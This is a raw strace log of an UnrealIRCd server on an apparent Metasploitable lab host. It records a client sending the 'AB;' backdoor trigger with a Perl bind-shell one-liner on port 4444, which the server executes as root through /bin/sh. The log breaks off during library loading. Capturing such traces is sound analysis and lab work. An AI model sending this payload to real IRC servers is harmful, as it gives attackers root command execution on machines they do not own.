4519  07:23:32.380079 select(1024, [2 3 4 7 9], [], NULL, {0, 490000}) = 1 (in [9], left {0, 280000})
4519  07:23:32.582822 clock_gettime(CLOCK_MONOTONIC, {1822, 399830945}) = 0
4519  07:23:32.582822 recv(9, "PRIVMSG  #testit3 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  07:23:32.582822 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582822 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582838 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582853 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582867 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582881 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582895 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582908 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582921 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582935 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582949 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582962 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582975 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.582989 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583002 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583016 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583029 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583043 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583056 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583070 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583084 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583097 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:32.583127 gettimeofday({1495625012, 583131}, NULL) = 0
4519  07:23:32.583140 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:23:32.588614 clock_gettime(CLOCK_MONOTONIC, {1822, 405629772}) = 0
4519  07:23:32.588628 time(NULL)        = 1495625012
4519  07:23:32.588638 time(NULL)        = 1495625012
4519  07:23:32.588654 gettimeofday({1495625012, 588658}, NULL) = 0
4519  07:23:32.588679 select(1024, [2], [], NULL, {0, 0}) = 1 (in [2], left {0, 0})
4519  07:23:32.588760 clock_gettime(CLOCK_MONOTONIC, {1822, 405773355}) = 0
4519  07:23:32.588771 gettimeofday({1495625012, 588774}, NULL) = 0
4519  07:23:32.588781 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [2], left {1, 0})
4519  07:23:32.588820 clock_gettime(CLOCK_MONOTONIC, {1822, 405832505}) = 0
4519  07:23:32.588831 accept(2, 0, NULL) = 5
4519  07:23:32.588855 getpeername(5, {sa_family=AF_INET, sin_port=htons(38557), sin_addr=inet_addr("10.0.2.4")}, [16]) = 0
4519  07:23:32.588885 fcntl64(5, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:23:32.588898 fcntl64(5, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:23:32.588911 setsockopt(5, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
4519  07:23:32.588923 setsockopt(5, SOL_SOCKET, SO_RCVBUF, [8192], 4) = 0
4519  07:23:32.588935 setsockopt(5, SOL_SOCKET, SO_SNDBUF, [8192], 4) = 0
4519  07:23:32.588946 getsockopt(5, SOL_IP, IP_OPTIONS, "", [0]) = 0
4519  07:23:32.589015 setsockopt(5, SOL_IP, IP_OPTIONS, NULL, 0) = 0
4519  07:23:32.589033 clock_gettime(CLOCK_MONOTONIC, {1822, 406046365}) = 0
4519  07:23:32.589045 socket(PF_INET, SOCK_DGRAM, IPPROTO_IP) = 6
4519  07:23:32.589057 fcntl64(6, F_GETFL) = 0x2 (flags O_RDWR)
4519  07:23:32.589075 fcntl64(6, F_SETFL, O_RDWR|O_NONBLOCK) = 0
4519  07:23:32.589085 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
4519  07:23:32.589095 connect(6, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, 16) = 0
4519  07:23:32.589111 send(6, "\230\345\1\0\0\1\0\0\0\0\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1", 39, MSG_NOSIGNAL) = 39
4519  07:23:32.589201 accept(2, 0, NULL) = -1 EAGAIN (Resource temporarily unavailable)
4519  07:23:32.589238 gettimeofday({1495625012, 589242}, NULL) = 0
4519  07:23:32.589249 select(1024, [2 3 4 6 7 9], [], NULL, {1, 0}) = 1 (in [6], left {1, 0})
4519  07:23:32.592047 clock_gettime(CLOCK_MONOTONIC, {1822, 409062887}) = 0
4519  07:23:32.592062 recvfrom(6, "\230\345\201\203\0\1\0\0\0\1\0\0\0014\0012\0010\00210\7in-addr\4arpa\0\0\f\0\1\300\22\0\6\0\1\0\0\1\0\0A\10prisoner\4iana\3org\0\nhostmaster\froot-servers\300AwsD\225\0\0\7\10\0\0\3\204\0\t:\200\0\t:\200", 513, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("132.70.60.124")}, [16]) = 116
4519  07:23:32.592102 close(6)          = 0
4519  07:23:32.592117 recvfrom(-1, 0xbfbaddf7, 513, 0, 0xbfbadff8, 0xbfbaddf0) = -1 EBADF (Bad file descriptor)
4519  07:23:32.592131 send(5, ":irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...\r\n:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn\'t resolve your hostname; using your IP address instead\r\n", 174, 0) = 174
4519  07:23:32.592208 time(NULL)        = 1495625012
4519  07:23:32.592222 time(NULL)        = 1495625012
4519  07:23:32.592234 gettimeofday({1495625012, 592237}, NULL) = 0
4519  07:23:32.592245 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:23:32.592274 clock_gettime(CLOCK_MONOTONIC, {1822, 409287148}) = 0
4519  07:23:32.592285 gettimeofday({1495625012, 592288}, NULL) = 0
4519  07:23:32.592295 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 510000})
4519  07:23:33.073018 clock_gettime(CLOCK_MONOTONIC, {1822, 890027033}) = 0
4519  07:23:33.073018 recv(7, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:23:33.073018 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073019 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073019 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073023 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073037 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073051 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073064 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073077 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073091 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073104 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073117 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073130 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073143 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073157 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073170 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073183 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073196 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073219 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073261 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073275 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073311 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073324 getrusage(RUSAGE_SELF, {ru_utime={0, 10000}, ru_stime={0, 310000}, ...}) = 0
4519  07:23:33.073340 gettimeofday({1495625013, 73344}, NULL) = 0
4519  07:23:33.073352 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {1, 0})
4519  07:23:33.073392 clock_gettime(CLOCK_MONOTONIC, {1822, 890405226}) = 0
4519  07:23:33.073404 recv(5, "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n", 8192, 0) = 244
4519  07:23:33.073433 rt_sigaction(SIGINT, {SIG_IGN}, {0x8062280, [HUP INT], 0}, 8) = 0
4519  07:23:33.073459 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
4519  07:23:33.073471 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
4519  07:23:33.073486 clone(child_stack=0, flags=CLONE_PARENT_SETTID|SIGCHLD, parent_tidptr=0xbfbae034) = 8461
8461  07:23:33.073553 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
8461  07:23:33.073567 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
8461  07:23:33.073577 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
8461  07:23:33.073590 execve("/bin/sh", ["sh", "-c", "AB;perl -MIO -e \'$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};\'\n"], [/* 14 vars */]) = 0
8461  07:23:33.073797 brk(0)            = 0x80f9000
8461  07:23:33.073820 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.073837 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5c000
8461  07:23:33.073853 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.073870 open("/etc/ld.so.cache", O_RDONLY) = 1
8461  07:23:33.073882 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8461  07:23:33.073900 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f54000
8461  07:23:33.073910 close(1)          = 0
8461  07:23:33.073921 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.073936 open("/lib/libncurses.so.5", O_RDONLY) = 1
8461  07:23:33.073948 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220\0\0004\0\0\0h\344\2\0\0\0\0\0004\0 \0\4\0(\0\32\0\31\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0T\305\2\0T\305\2\0\5\0\0\0\0\20\0\0\1\0\0\0T\305\2\0T\325\2\0T\325\2\0004\36\0\0 \"\0\0\6\0\0\0\0\20\0\0\2\0\0\0\34\335\2\0\34\355\2\0\34\355\2\0\330\0\0\0\330\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\t\2\0\0&\2\0\0z\1\0\0L\0\0\0\0\0\0\0\0\0\0\0\25\0\0\0\333\1\0\0\0\0\0\0\0\0\0\0\t\2\0\0\20\2\0\0E\1\0\0\0\0\0\0\0\0\0\0T\0\0\0\367\1\0\0\0\0\0\0\0\0\0\0\306\1\0\0L\1\0\0\203\0\0\0\236\1\0\0\0\0\0\0\0\0\0\0\320\0\0\0005\0\0\0\233\1\0\0\375\0\0\0\265\0\0\0\0\0\0\0\267\0\0\0\0\0\0\0\246\1\0\0\33\1\0\0\300\1\0\0\356\0\0\0\223\0\0\0@\1\0\0\365\1\0\0\23\2\0\0O\0\0\0\303\1\0\0\0\0\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\0\0\0\225\0\0\0|\0\0\0\0\0\0\0x\0\0\0\364\1\0\0\0\0\0\0\21\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0^\1\0\0\0\0\0\0\22\2\0\0\0\0\0\0\371\0\0\0\33\0\0\0f\0\0\0\37\1\0\0\222\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\354\0\0\0\261\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\36\2\0\0\0\0\0\0\5\0\0\0\364\0\0\0\0\0\0\0R\0\0\0", 512) = 512
8461  07:23:33.074090 fstat64(1, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
8461  07:23:33.074108 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f24000
8461  07:23:33.074120 mmap2(0xb7f51000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x2c) = 0xb7f51000
8461  07:23:33.074136 close(1)          = 0
8461  07:23:33.074148 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.074162 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
8461  07:23:33.074176 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
8461  07:23:33.074323 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
8461  07:23:33.074340 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f20000
8461  07:23:33.074351 mmap2(0xb7f22000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f22000
8461  07:23:33.074367 close(1)          = 0
8461  07:23:33.074378 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.074392 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
8461  07:23:33.074405 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
8461  07:23:33.074491 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
8461  07:23:33.074507 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f1f000
8461  07:23:33.074521 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dd0000
8461  07:23:33.074531 mmap2(0xb7f19000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7f19000
8461  07:23:33.074546 mmap2(0xb7f1c000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7f1c000
8461  07:23:33.074559 close(1)          = 0
8461  07:23:33.074581 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dcf000
8461  07:23:33.074592 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dcf6b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
8461  07:23:33.074647 mprotect(0xb7f19000, 4096, PROT_READ) = 0
8461  07:23:33.074682 munmap(0xb7f54000, 29913) = 0
8461  07:23:33.074738 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8461  07:23:33.074774 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
8461  07:23:33.074827 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcedeb0) = -1 ENOTTY (Inappropriate ioctl for device)
8461  07:23:33.074860 brk(0)            = 0x80f9000
8461  07:23:33.074869 brk(0x80fa000)    = 0x80fa000
8461  07:23:33.074881 brk(0x80fb000)    = 0x80fb000
8461  07:23:33.074897 getuid32()        = 0
8461  07:23:33.074906 getgid32()        = 0
8461  07:23:33.074915 geteuid32()       = 0
8461  07:23:33.074923 getegid32()       = 0
8461  07:23:33.074937 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8461  07:23:33.074950 time(NULL)        = 1495625013
8461  07:23:33.074962 brk(0x80fc000)    = 0x80fc000
8461  07:23:33.074977 brk(0x80fd000)    = 0x80fd000
8461  07:23:33.074996 open("/proc/meminfo", O_RDONLY) = 1
8461  07:23:33.075017 fstat64(1, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
8461  07:23:33.075035 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5b000
8461  07:23:33.075046 read(1, "MemTotal:      1035240 kB\nMemFree:        511268 kB\nBuffers:         66640 kB\nCached:         299728 kB\nSwapCached:          0 kB\nActive:         255028 kB\nInactive:       240304 kB\nHighTotal:      131008 kB\nHighFree:          240 kB\nLowTotal:       904232 kB\nLowFree:        511028 kB\nSwapTotal:           0 kB\nSwapFree:            0 kB\nDirty:            5184 kB\nWriteback:           0 kB\nAnonPages:      128984 kB\nMapped:          52008 kB\nSlab:            17412 kB\nSReclaimable:     9104 kB\nSUnreclaim:       8308 kB\nPageTables:       1952 kB\nNFS_Unstable:        0 kB\nBounce:              0 kB\nCommitLimit:    517620 kB\nCommitted_AS:   635396 kB\nVmallocTotal:   118776 kB\nVmallocUsed:      3420 kB\nVmallocChunk:   114760 kB\nHugePages_Total:     0\nHugePages_Free:      0\nHugePages_Rsvd:      0\nHugePages_Surp:      0\nHugepagesize:     2048 kB\n", 1024) = 846
8461  07:23:33.075128 close(1)          = 0
8461  07:23:33.075138 munmap(0xb7f5b000, 4096) = 0
8461  07:23:33.075150 brk(0x80fe000)    = 0x80fe000
8461  07:23:33.075177 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
8461  07:23:33.075191 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
8461  07:23:33.075251 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8461  07:23:33.075294 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
8461  07:23:33.075306 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
8461  07:23:33.075318 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
8461  07:23:33.075332 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
8461  07:23:33.075357 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
8461  07:23:33.075370 uname({sys="Linux", node="metasploitable", ...}) = 0
8461  07:23:33.075417 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8461  07:23:33.075435 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8461  07:23:33.075453 brk(0x8100000)    = 0x8100000
8461  07:23:33.075464 getcwd("/etc/unreal", 4096) = 12
8461  07:23:33.075479 getpid()          = 8461
8461  07:23:33.075494 getppid()         = 4519
8461  07:23:33.075510 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
8461  07:23:33.075529 stat64("/sbin/sh", 0xbfcede88) = -1 ENOENT (No such file or directory)
8461  07:23:33.075541 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
8461  07:23:33.075558 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
8461  07:23:33.075582 socket(PF_FILE, SOCK_STREAM, 0) = 1
8461  07:23:33.075594 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
8461  07:23:33.075606 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
8461  07:23:33.075627 close(1)          = 0
8461  07:23:33.075638 socket(PF_FILE, SOCK_STREAM, 0) = 1
8461  07:23:33.075648 fcntl64(1, F_SETFL, O_RDWR|O_NONBLOCK) = 0
8461  07:23:33.075658 connect(1, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
8461  07:23:33.075675 close(1)          = 0
8461  07:23:33.075688 open("/etc/nsswitch.conf", O_RDONLY) = 1
8461  07:23:33.075711 fstat64(1, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
8461  07:23:33.075771 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5b000
8461  07:23:33.075787 read(1, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
8461  07:23:33.075838 read(1, "", 4096) = 0
8461  07:23:33.075861 close(1)          = 0
8461  07:23:33.075871 munmap(0xb7f5b000, 4096) = 0
8461  07:23:33.075886 open("/etc/ld.so.cache", O_RDONLY) = 1
8461  07:23:33.075898 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8461  07:23:33.075914 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f54000
8461  07:23:33.075924 close(1)          = 0
8461  07:23:33.075934 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8461  07:23:33.075949 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 1
8461  07:23:33.075963 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\0004\0\0\0\204r\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0001a\0\0001a\0\0001a\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274c\0\0\274c\0\0\5\0\0\0\0\20\0\0\1\0\0\0\340n\0\0\340~\0\0\340~\0\0\250\2\0\0h\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\364n\0\0\364~\0\0\364~\0\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 